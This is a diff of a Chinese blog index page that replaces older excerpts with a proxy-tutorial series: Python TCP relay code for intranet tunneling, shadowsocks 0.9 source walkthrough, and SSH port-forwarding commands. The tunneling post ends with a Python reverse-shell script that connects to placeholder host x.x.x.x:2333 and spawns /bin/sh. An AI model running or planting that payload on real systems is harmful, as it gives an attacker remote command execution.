@@ -72,10 +72,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-写给前端的甩锅指南" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-由浅入深写代理-10-反向代理" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2017/03/08/写给前端的甩锅指南/" class="article-date">
-  <time datetime="2017-03-08T08:04:53.000Z" itemprop="datePublished">2017-03-08</time>
+    <a href="/2017/08/26/由浅入深写代理-10-反向代理/" class="article-date">
+  <time datetime="2017-08-26T06:27:04.000Z" itemprop="datePublished">2017-08-26</time>
 </a>
     
   </div>
@@ -86,7 +86,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/08/写给前端的甩锅指南/">写给前端的甩锅指南</a>
+      <a class="article-title" href="/2017/08/26/由浅入深写代理-10-反向代理/">由浅入深写代理(10)-内网穿透</a>
     </h1>
   
 
@@ -94,21 +94,33 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">前端小白，“老王，你的接口不能用了”</div><div class="line">后端老王一脸不屑，“怎么可能，刚刚还能用，你看看参数传对了没有。” </div><div class="line">前端小白吭哧吭哧检查了几遍，“参数没问题啊，你看看是不是有 username, id。。。”</div><div class="line">后端老王顿了许久， “参数应该没问题，你再清下浏览器缓存试试”</div><div class="line">前端小白摁着 &quot;ctr + f5&quot; 刷新了好多次， 一脸苦逼的说：“清完浏览器缓存了，还是有问题”</div><div class="line">后端老王略过一丝疑虑，难道是我接口出问题了，不该啊，刚还能用，都测试好几遍了，说道：“你看看是不是数据库存的测试数据有问题，删了再试试，或者换个浏览器，重启下 server。”</div><div class="line">前端小白照着老王的方法逐一尝试着。。。</div><div class="line">突然老王拍了下脑瓜，一脸尴尬的说：“小白，我刚 fix 一个线上 bug, 测试环境换了分支，所以接口出问题了。”</div><div class="line">小白一脸生无可恋的望着老王头顶的地中海发呆。。。</div></pre></td></tr></table></figure>
-<p>上面情节纯属虚构，作为一个后端开发人员，我怎么忍心这么黑自己的同行呢 😭。不过思考下这么一个问题，前端如何能够快速的定位问题呢。这里面跟很多因素有关，比如前后端协作流程是否完善，前后端人员的经验。<br>
-        
-          <p class="article-more-link">
-            <a href="/2017/03/08/写给前端的甩锅指南/#more">Read More</a>
-          </p>
-        
+        <p>本篇主要介绍代理的一个常用的功能：内网穿透<br>很多人经常会有这么一个需求，需要将本地开发的 web 项目给外网的人看下，再搭一遍到 vps 太麻烦，于是就有借助拥有公网 ip 的主机来中转。</p>
+<p>有专门的软件做这件事，如 ngrok, frp。</p>
+<p>介绍下原理<br>由于内网的机器有 NAT 或 防火墙什么的，外网 vps 是无法会直接连接的，所以想要通过 vps 来中转就需要内网先连接 vps，然后 vps 通过连接的套接字来转发数据。</p>
+<p>贴下代码</p>
+<p>client_proxy</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">import socket</div><div class="line">import select</div><div class="line"></div><div class="line">def send_data(sock, data):</div><div class="line">    print(data)</div><div class="line">    bytes_sent = 0</div><div class="line">    while True:</div><div class="line">        r = sock.send(data[bytes_sent:])</div><div class="line">        if r &lt; 0:</div><div class="line">            return r</div><div class="line">        bytes_sent += r</div><div class="line">        if bytes_sent == len(data):</div><div class="line">            return bytes_sent</div><div class="line"></div><div class="line">def handle_tcp(sock, remote):</div><div class="line">    # 处理 client socket 和 remote socket 的数据流</div><div class="line">    try:</div><div class="line">        fdset = [sock, remote]</div><div class="line">        while True:</div><div class="line">            # 用 IO 多路复用 select 监听套接字是否有数据流</div><div class="line">            r, w, e = select.select(fdset, [], [])</div><div class="line">            if sock in r:</div><div class="line">                data = sock.recv(4096)</div><div class="line">                if len(data) &lt;= 0:</div><div class="line">                    break</div><div class="line">                result = send_data(remote, data)</div><div class="line">                if result &lt; len(data):</div><div class="line">                    raise Exception(&apos;failed to send all data&apos;)</div><div class="line"></div><div class="line">            if remote in r:</div><div class="line">                data = remote.recv(4096)</div><div class="line">                if len(data) &lt;= 0:</div><div class="line">                    break</div><div class="line">                result = send_data(sock, data)</div><div class="line">                if result &lt; len(data):</div><div class="line">                    raise Exception(&apos;failed to send all data&apos;)</div><div class="line">    except Exception as e:</div><div class="line">        raise(e)</div><div class="line">    finally:</div><div class="line">        sock.close()</div><div class="line">        remote.close()</div><div class="line"></div><div class="line">while True:</div><div class="line">    s_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    s_conn.connect((&quot;xx.xx.xx.xx&quot;, 2333))</div><div class="line"></div><div class="line">    client_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    client_conn.connect((&apos;127.0.0.1&apos;, 8000))</div><div class="line"></div><div class="line">    handle_tcp(s_conn, client_conn)</div></pre></td></tr></table></figure>
+<p>server_proxy</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line">import threading</div><div class="line">import socket</div><div class="line">import select</div><div class="line"></div><div class="line"></div><div class="line"># AF_INET: 基于 IPV4 的网络通信 SOCK_STREAM: 基于 TCP 的流式 socket 通信</div><div class="line">s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">s1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</div><div class="line"></div><div class="line"># 将套接字绑定到地址</div><div class="line">s1.bind((&apos;&apos;, 2333))</div><div class="line"># 监听TCP传入连接</div><div class="line">s1.listen(5)</div><div class="line"></div><div class="line"></div><div class="line"># AF_INET: 基于 IPV4 的网络通信 SOCK_STREAM: 基于 TCP 的流式 socket 通信</div><div class="line">s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</div><div class="line"># 将套接字绑定到地址</div><div class="line">s2.bind((&apos;&apos;, 8000))</div><div class="line"># 监听TCP传入连接</div><div class="line">s2.listen(5)</div><div class="line"></div><div class="line"></div><div class="line">def send_data(sock, data):</div><div class="line">    print(data)</div><div class="line">    bytes_sent = 0</div><div class="line">    while True:</div><div class="line">        r = sock.send(data[bytes_sent:])</div><div class="line">        if r &lt; 0:</div><div class="line">            return r</div><div class="line">        bytes_sent += r</div><div class="line">        if bytes_sent == len(data):</div><div class="line">            return bytes_sent</div><div class="line"></div><div class="line"></div><div class="line">def handle_tcp(sock, remote):</div><div class="line">    # 处理 client socket 和 remote socket 的数据流</div><div class="line">    try:</div><div class="line">        fdset = [sock, remote]</div><div class="line">        while True:</div><div class="line">            # 用 IO 多路复用 select 监听套接字是否有数据流</div><div class="line">            r, w, e = select.select(fdset, [], [])</div><div class="line">            if sock in r:</div><div class="line">                data = sock.recv(4096)</div><div class="line">                if len(data) &lt;= 0:</div><div class="line">                    break</div><div class="line">                result = send_data(remote, data)</div><div class="line">                if result &lt; len(data):</div><div class="line">                    raise Exception(&apos;failed to send all data&apos;)</div><div class="line"></div><div class="line">            if remote in r:</div><div class="line">                data = remote.recv(4096)</div><div class="line">                if len(data) &lt;= 0:</div><div class="line">                    break</div><div class="line">                result = send_data(sock, data)</div><div class="line">                if result &lt; len(data):</div><div class="line">                    raise Exception(&apos;failed to send all data&apos;)</div><div class="line">    except Exception as e:</div><div class="line">        raise(e)</div><div class="line">    finally:</div><div class="line">        sock.close()</div><div class="line">        remote.close()</div><div class="line"></div><div class="line"></div><div class="line">while True:</div><div class="line">    con1, addr1 = s1.accept()</div><div class="line">    print(&quot;new connection from %s:%s&quot; % addr1)</div><div class="line">    con2, addr2 = s2.accept()</div><div class="line">    print(&quot;new connection from %s:%s&quot; % addr2)</div><div class="line">    t = threading.Thread(target=handle_tcp, args=(con1, con2))</div><div class="line">    t.start()</div></pre></td></tr></table></figure>
+<ol>
+<li>假设我们需要共享的 web 是 python 的 simple http_server， 首先执行 python -m SimpleHTTPServer, 这样本地会绑定 8000 端口</li>
+<li>在自己的 vps 上运行 python3 reverse_server.py</li>
+<li>在本地运行 python3 reverse_client_proxy.py</li>
+<li>接下来我们直接在外网访问 vps 的地址: <a href="http://xx.xx.xx.xx:8000" target="_blank" rel="external">http://xx.xx.xx.xx:8000</a> 就可以发现能够转发内网的数据了。</li>
+</ol>
+<p><img src="/media/15037300977077.jpg" alt=""></p>
+<p>github 地址: <a href="https://github.com/facert/socket-example/blob/master/reverse_client_proxy.py" target="_blank" rel="external">reverse_client_proxy.py</a></p>
+<p><a href="https://github.com/facert/socket-example/blob/master/reverse_server_proxy.py" target="_blank" rel="external">reverse_server_proxy</a></p>
+<p>一般内网穿透在网络安全人员做内网渗透测试的时候比较有用，反弹一个 shell。就可以任意执行命令。</p>
+<p>这里分享一个最基本的 python 反弹 shell 脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> socket,subprocess,os</div><div class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div><div class="line">s.connect((<span class="string">"x.x.x.x"</span>,<span class="number">2333</span>))</div><div class="line">os.dup2(s.fileno(),<span class="number">0</span>)</div><div class="line">os.dup2(s.fileno(),<span class="number">1</span>)</div><div class="line">os.dup2(s.fileno(),<span class="number">2</span>)</div><div class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>]);</div></pre></td></tr></table></figure>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/03/08/写给前端的甩锅指南/" data-id="cj0124mg40000jlo06vl49uvk" class="article-share-link">Teilen</a>
+      <a data-url="http://yoursite.com/2017/08/26/由浅入深写代理-10-反向代理/" data-id="cj6u5abmq001b1jo0n0pn3uff" class="article-share-link">Teilen</a>
       
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web开发/">web开发</a></li></ul>
-
     </footer>
   </div>
   
@@ -117,10 +129,10 @@
 
 
   
-    <article id="post-过滤豆瓣租房小组中介贴之-python-实现-k-近邻算法（四）" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-由浅入深写代理-8-shadowsocks-代理-md" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2017/03/06/过滤豆瓣租房小组中介贴之-python-实现-k-近邻算法（四）/" class="article-date">
-  <time datetime="2017-03-06T05:21:02.000Z" itemprop="datePublished">2017-03-06</time>
+    <a href="/2017/08/20/由浅入深写代理-8-shadowsocks-代理-md/" class="article-date">
+  <time datetime="2017-08-20T11:20:39.000Z" itemprop="datePublished">2017-08-20</time>
 </a>
     
   </div>
@@ -131,7 +143,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/06/过滤豆瓣租房小组中介贴之-python-实现-k-近邻算法（四）/">过滤豆瓣租房小组中介贴之 python 实现 k 近邻算法（四）</a>
+      <a class="article-title" href="/2017/08/20/由浅入深写代理-8-shadowsocks-代理-md/">由浅入深写代理(8)-ss-代理.md</a>
     </h1>
   
 
@@ -139,21 +151,23 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>豆瓣有各种小组，每个小组会有个主题，比如租房小组基本里面全是房源相关的，当然偶尔也会有广告出现。那么如何能够让机器知道你发的帖子到底是哪个主题的呢，简单来说就是如何给帖子分类。这个时候需要介绍机器学习一个最简单的算法，叫 <code>k 近邻算法</code>。 原理介绍见这篇 <a href="http://coolshell.cn/articles/8052.html">K NEAREST NEIGHBOR 算法</a>，</p>
-<p><img src="/media/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-03-06%20%E4%B8%8B%E5%8D%881.35.46.png" alt="屏幕快照 2017-03-06 下午1.35.46"><br>
-        
-          <p class="article-more-link">
-            <a href="/2017/03/06/过滤豆瓣租房小组中介贴之-python-实现-k-近邻算法（四）/#more">Read More</a>
-          </p>
-        
+        <p>ss 作用是科学上网，因为怕关键词会让文章被干掉，所以用了别名。本文纯粹是分析技术的角度出发。因为 ss 现在的版本已经很复杂了，eventloop, 状态机，支持 udp 。为了简单讲原理，我们用 0.9 的版本来说明。</p>
+<p>首先上图</p>
+<p><img src="/media/15032288280119.jpg" alt=""></p>
+<p>client 和 ss_local 主要通过 socks5 协议通信，而 ss_local 和 ss_server 之间就是对称加密的 tcp 数据。</p>
+<p>ss_local 主要代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line">class Socks5Server(SocketServer.StreamRequestHandler):</div><div class="line">    &apos;&apos;&apos; RequesHandlerClass Definition &apos;&apos;&apos;</div><div class="line">    def handle_tcp(self, sock, remote):</div><div class="line">        try:</div><div class="line">            fdset = [sock, remote]</div><div class="line">            while True:</div><div class="line">                r, w, e = select.select(fdset, [], [])      # use select I/O multiplexing model</div><div class="line">                if sock in r:                               # if local socket is ready for reading</div><div class="line">                    data = sock.recv(4096)</div><div class="line">                    if len(data) &lt;= 0:                      # received all data</div><div class="line">                        break</div><div class="line">                    result = send_all(remote, self.encrypt(data))   # send data after encrypting</div><div class="line">                    if result &lt; len(data):</div><div class="line">                        raise Exception(&apos;failed to send all data&apos;)</div><div class="line"></div><div class="line">                if remote in r:                             # remote socket(proxy) ready for reading</div><div class="line">                    data = remote.recv(4096)</div><div class="line">                    if len(data) &lt;= 0:</div><div class="line">                        break</div><div class="line">                    result = send_all(sock, self.decrypt(data))     # send to local socket(application)</div><div class="line">                    if result &lt; len(data):</div><div class="line">                        raise Exception(&apos;failed to send all data&apos;)</div><div class="line">        finally:</div><div class="line">            sock.close()</div><div class="line">            remote.close()</div><div class="line"></div><div class="line">    def encrypt(self, data):</div><div class="line">        return data.translate(encrypt_table)</div><div class="line"></div><div class="line">    def decrypt(self, data):</div><div class="line">        return data.translate(decrypt_table)</div><div class="line"></div><div class="line">    def send_encrypt(self, sock, data):</div><div class="line">        sock.send(self.encrypt(data))</div><div class="line"></div><div class="line">    def handle(self):</div><div class="line">        try:</div><div class="line">            sock = self.connection        # local socket [127.1:port]</div><div class="line">            sock.recv(262)                # Sock5 Verification packet</div><div class="line">            sock.send(&quot;\x05\x00&quot;)         # Sock5 Response: &apos;0x05&apos; Version 5; &apos;0x00&apos; NO AUTHENTICATION REQUIRED</div><div class="line">            # After Authentication negotiation</div><div class="line">            data = self.rfile.read(4)     # Forward request format: VER CMD RSV ATYP (4 bytes)</div><div class="line">            mode = ord(data[1])           # CMD == 0x01 (connect)</div><div class="line">            if mode != 1:</div><div class="line">                logging.warn(&apos;mode != 1&apos;)</div><div class="line">                return</div><div class="line">            addrtype = ord(data[3])       # indicate destination address type</div><div class="line">            addr_to_send = data[3]</div><div class="line">            if addrtype == 1:             # IPv4</div><div class="line">                addr_ip = self.rfile.read(4)            # 4 bytes IPv4 address (big endian)</div><div class="line">                addr = socket.inet_ntoa(addr_ip)</div><div class="line">                addr_to_send += addr_ip</div><div class="line">            elif addrtype == 3:           # FQDN (Fully Qualified Domain Name)</div><div class="line">                addr_len = self.rfile.read(1)           # Domain name&apos;s Length</div><div class="line">                addr = self.rfile.read(ord(addr_len))   # Followed by domain name(e.g. www.google.com)</div><div class="line">                addr_to_send += addr_len + addr</div><div class="line">            else:</div><div class="line">                logging.warn(&apos;addr_type not support&apos;)</div><div class="line">                # not support</div><div class="line">                return</div><div class="line">            addr_port = self.rfile.read(2)</div><div class="line">            addr_to_send += addr_port                   # addr_to_send = ATYP + [Length] + dst addr/domain name + port</div><div class="line">            port = struct.unpack(&apos;&gt;H&apos;, addr_port)       # prase the big endian port number. Note: The result is a tuple even if it contains exactly one item.</div><div class="line">            try:</div><div class="line">                reply = &quot;\x05\x00\x00\x01&quot;              # VER REP RSV ATYP</div><div class="line">                reply += socket.inet_aton(&apos;0.0.0.0&apos;) + struct.pack(&quot;&gt;H&quot;, 2222)  # listening on 2222 on all addresses of the machine, including the loopback(127.0.0.1)</div><div class="line">                self.wfile.write(reply)                 # response packet</div><div class="line">                # reply immediately</div><div class="line">                if &apos;-6&apos; in sys.argv[1:]:                # IPv6 support</div><div class="line">                    remote = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)</div><div class="line">                else:</div><div class="line">                    remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">                remote.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)       # turn off Nagling</div><div class="line">                remote.connect((SERVER, REMOTE_PORT))</div><div class="line">                self.send_encrypt(remote, addr_to_send)      # encrypted</div><div class="line">                logging.info(&apos;connecting %s:%d&apos; % (addr, port[0]))</div><div class="line">            except socket.error, e:</div><div class="line">                logging.warn(e)</div><div class="line">                return</div><div class="line">            self.handle_tcp(sock, remote)</div><div class="line">        except socket.error, e:</div><div class="line">            logging.warn(e)</div></pre></td></tr></table></figure>
+<p>其中和 socks5 交互的部分 <code>handle</code> 在前面 socks5 教程已经讲过，唯一的区别是 <code>send_encrypt</code> 函数，每次 send 的时候都会 encrypt 一次，拿到数据后再 decrypt 一次。</p>
+<p>ss_server 的代码也和 local 差不多，少了和 socks5 打交道</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">def handle(self):</div><div class="line">        try:</div><div class="line">            sock = self.connection</div><div class="line">            addrtype = ord(self.decrypt(sock.recv(1)))      # receive addr type</div><div class="line">            if addrtype == 1:</div><div class="line">                addr = socket.inet_ntoa(self.decrypt(self.rfile.read(4)))   # get dst addr</div><div class="line">            elif addrtype == 3:</div><div class="line">                addr = self.decrypt(</div><div class="line">                    self.rfile.read(ord(self.decrypt(sock.recv(1)))))       # read 1 byte of len, then get &apos;len&apos; bytes name</div><div class="line">            else:</div><div class="line">                # not support</div><div class="line">                logging.warn(&apos;addr_type not support&apos;)</div><div class="line">                return</div><div class="line">            port = struct.unpack(&apos;&gt;H&apos;, self.decrypt(self.rfile.read(2)))    # get dst port into small endian</div><div class="line">            try:</div><div class="line">                logging.info(&apos;connecting %s:%d&apos; % (addr, port[0]))</div><div class="line">                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">                remote.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)</div><div class="line">                remote.connect((addr, port[0]))         # connect to dst</div><div class="line">            except socket.error, e:</div><div class="line">                # Connection refused</div><div class="line">                logging.warn(e)</div><div class="line">                return</div><div class="line">            self.handle_tcp(sock, remote)</div><div class="line">        except socket.error, e:</div><div class="line">            logging.warn(e)</div></pre></td></tr></table></figure>
+<p>所以本质上 ss 很简单，就是做了流量的转发，只不过为了避免流量被检测，加密并且还有混淆的功能。</p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/03/06/过滤豆瓣租房小组中介贴之-python-实现-k-近邻算法（四）/" data-id="cj012226s0013dfo0zub1usxk" class="article-share-link">Teilen</a>
+      <a data-url="http://yoursite.com/2017/08/20/由浅入深写代理-8-shadowsocks-代理-md/" data-id="cj6u5abmx001h1jo07io3jk26" class="article-share-link">Teilen</a>
       
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/algorithm/">algorithm</a></li></ul>
-
     </footer>
   </div>
   
@@ -162,10 +176,10 @@
 
 
   
-    <article id="post-过滤豆瓣租房小组中介贴之 python 实现 TF-IDF 算法（二）" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-由浅入深写代理-9-ssh-代理-md" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2017/02/04/过滤豆瓣租房小组中介贴之 python 实现 TF-IDF 算法（二）/" class="article-date">
-  <time datetime="2017-02-04T11:16:04.000Z" itemprop="datePublished">2017-02-04</time>
+    <a href="/2017/08/20/由浅入深写代理-9-ssh-代理-md/" class="article-date">
+  <time datetime="2017-08-20T10:07:41.000Z" itemprop="datePublished">2017-08-20</time>
 </a>
     
   </div>
@@ -176,7 +190,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2017/02/04/过滤豆瓣租房小组中介贴之 python 实现 TF-IDF 算法（二）/">过滤豆瓣租房小组中介贴之 python 实现 TF-IDF 算法（二）</a>
+      <a class="article-title" href="/2017/08/20/由浅入深写代理-9-ssh-代理-md/">由浅入深写代理(9)-ssh-代理.md</a>
     </h1>
   
 
@@ -184,20 +198,21 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>前段时间写过一篇 <a href="https://facert.github.io/2016/11/24/%E8%BF%87%E6%BB%A4%E8%B1%86%E7%93%A3%E7%A7%9F%E6%88%BF%E5%B0%8F%E7%BB%84%E4%B8%AD%E4%BB%8B%E8%B4%B4%E4%B9%8B%20python%20%E5%AE%9E%E7%8E%B0%E4%BD%99%E5%BC%A6%E7%9B%B8%E4%BC%BC%E5%BA%A6%EF%BC%88%E4%B8%80%EF%BC%89/">过滤豆瓣租房小组中介贴之 python 实现余弦相似度（一）</a>, 这里面使用 <code>jieba</code> 将文档分词，然后计算对分词的结果向量化计算相似度。比如 <code>我的房子在方庄地铁附近的芳城园一区</code> 会被分词为 <code>方庄 芳城园 一区 地铁 房子 附近</code>，我们发现少了 <code>我 的 在</code> 这些词，在自然语言处理的过程中，称这些词为停用词，简单的说就是这些词对于分词结果没有多少帮助，所以需要直接过滤掉。因为我们直接调用 <code>jieba.analyse</code> 方法，所以停用词被直接过滤了，如果只是调用 <code>jieba.cut</code>，会将返回包含停用词的结果。<br>
-        
-          <p class="article-more-link">
-            <a href="/2017/02/04/过滤豆瓣租房小组中介贴之 python 实现 TF-IDF 算法（二）/#more">Read More</a>
-          </p>
-        
+        <p>其实 ssh 不算是代理，只是一种能实现代理的工具，不过因为 ssh 功能强大，所以单独拿出来说一下。</p>
+<h3 id="0x01-本地端口转发"><a href="#0x01-本地端口转发" class="headerlink" title="0x01 本地端口转发"></a>0x01 本地端口转发</h3><p>举个例子，远程有个 mongo 服务器需要连接，但是 mongo 不允许远程连接，只能通过和它同一个局域网的跳板机 A （x.x.x.x）连接。这个时候可以通过端口转发的方法直接连接。<br>命令格式是：<br><figure class="highlight plain"><figcaption><span>-L <local port="">:<remote host="">:<remote port=""> <ssh hostname="">```</ssh></remote></remote></local></span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">例如本地开启了 8000 端口监听， mongo 服务器地址为 192.168.0.2 端口  27017, 跳板机地址 192.168.0.1：</div><div class="line">``` ssh -N -L 8000:192.168.0.2:27017  192.168.0.1</div></pre></td></tr></table></figure></p>
+<p>开启完端口转发后，连接 mongo 可以直接通过命令 mongo –host localhost –port 8000</p>
+<h3 id="0x02-远程端口转发"><a href="#0x02-远程端口转发" class="headerlink" title="0x02 远程端口转发"></a>0x02 远程端口转发</h3><p>远程端口转发和本地端口转发功能一样，唯一的区别在于 ssh client 端和 server 端相反。举上面的例子，本地 client 无法通过 ssh 连接 A, 但是 A 能 ssh 连接本地。这种情况下可以通过远程端口转发<br>命令格式：<br><figure class="highlight plain"><figcaption><span>-R <local port="">:<remote host="">:<remote port=""> <ssh hostname=""></ssh></remote></remote></local></span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">```</div><div class="line">上例可以在本地运行</div><div class="line">``` ssh -R 8000:192.168.0.2:27017  192.168.0.1</div></pre></td></tr></table></figure></p>
+<h3 id="0x03-动态转发"><a href="#0x03-动态转发" class="headerlink" title="0x03 动态转发"></a>0x03 动态转发</h3><p>动态端口允许通过配置一个本地端口，把通过隧道的数据转发到远端的所有地址。本地的应用程序需要使用 Socks 协议与本地端口通讯。此时 SSH 充当 Socks 代理服务器的角色。</p>
+<p><img src="/media/15032247248211.jpg" alt=""></p>
+<p>简单的说就是和 ss 功能一样，只是中间的加密有 openssl 来做。</p>
+<p>命令如下<br><figure class="highlight plain"><figcaption><span>-D <local port=""> <ssh server="">```</ssh></local></span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">上面的例子可以如下设置</div><div class="line">``` ssh -f -N -D 10.1.1.1:8000 B@192.168.0.1</div></pre></td></tr></table></figure></p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/02/04/过滤豆瓣租房小组中介贴之 python 实现 TF-IDF 算法（二）/" data-id="cj012226h000zdfo0fesrk67c" class="article-share-link">Teilen</a>
+      <a data-url="http://yoursite.com/2017/08/20/由浅入深写代理-9-ssh-代理-md/" data-id="cj6u5abn1001i1jo0qhzp0odl" class="article-share-link">Teilen</a>
       
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/algorithm/">algorithm</a></li></ul>
-
     </footer>
   </div>
   
@@ -206,10 +221,10 @@
 
 
   
-    <article id="post-过滤豆瓣租房小组中介贴之 python 实现 布隆过滤器（三）" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-由浅入深写代理-7-http-代理-md" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2017/02/04/过滤豆瓣租房小组中介贴之 python 实现 布隆过滤器（三）/" class="article-date">
-  <time datetime="2017-02-04T09:43:00.000Z" itemprop="datePublished">2017-02-04</time>
